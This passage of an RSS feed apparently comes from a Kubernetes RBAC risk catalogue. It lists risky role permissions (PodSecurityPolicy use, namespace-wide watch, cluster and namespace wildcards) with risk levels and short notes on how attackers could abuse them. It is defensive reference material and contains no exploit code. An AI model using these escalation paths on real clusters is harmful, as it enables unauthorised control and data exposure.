 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>policy, extensions&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>podsecuritypolicies&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>use&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-deprecatedfeature">&lt;a href="https://rbac-atlas.github.io/tags/deprecatedfeature/">DeprecatedFeature&lt;/a>&lt;/span>
 &lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-podsecuritypolicy">&lt;a href="https://rbac-atlas.github.io/tags/podsecuritypolicy/">PodSecurityPolicy&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows a user/service account to use a specific PodSecurityPolicy (PSP) that may grant excessive privileges (e.g., hostPath mounts, privileged mode). If the PSP is overly permissive, this leads to direct privilege escalation by creating pods that use it. (Note: PSPs are deprecated in 1.21 and removed in 1.25).&lt;/p></description></item><item><title>Watch All Resources in a Namespace (Broad Information Disclosure)</title><link>https://rbac-atlas.github.io/rules/1103/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1103/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1103&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Watch All Resources in a Namespace (Broad Information Disclosure)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-wildcardpermission">&lt;a href="https://rbac-atlas.github.io/tags/wildcardpermission/">WildcardPermission&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows using the &amp;lsquo;watch&amp;rsquo; verb on all resources (&amp;rsquo;*&amp;rsquo;) within a specific namespace. This provides an attacker with a real-time stream of all changes occurring to any resource in that namespace, offering extensive intelligence for further exploitation, understanding application behavior, or identifying sensitive data flows.&lt;/p></description></item><item><title>Wildcard permission on all resources cluster-wide (Cluster Admin)</title><link>https://rbac-atlas.github.io/rules/1060/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1060/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1060&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Wildcard permission on all resources cluster-wide (Cluster Admin)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
 (+2 more)&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants unrestricted, wildcard (&amp;rsquo;*&amp;rsquo;) access to all API groups, resources, and verbs across the entire cluster. This is equivalent to full cluster administrator privileges, allowing complete control and compromise of the Kubernetes cluster.&lt;/p></description></item><item><title>Wildcard permission on all resources in a namespace (Namespace Admin)</title><link>https://rbac-atlas.github.io/rules/1061/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1061/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1061&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Wildcard permission on all resources in a namespace (Namespace Admin)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>*&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-namespaceadmin">&lt;a href="https://rbac-atlas.github.io/tags/namespaceadmin/">NamespaceAdmin&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
 (+2 more)&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants unrestricted, wildcard (&amp;rsquo;*&amp;rsquo;) access to all API groups, resources, and verbs within a specific namespace. This provides full administrative control over that namespace and can often be leveraged to escalate privileges to cluster-wide admin depending on the cluster configuration and installed operators.&lt;/p></description></item></channel></rss>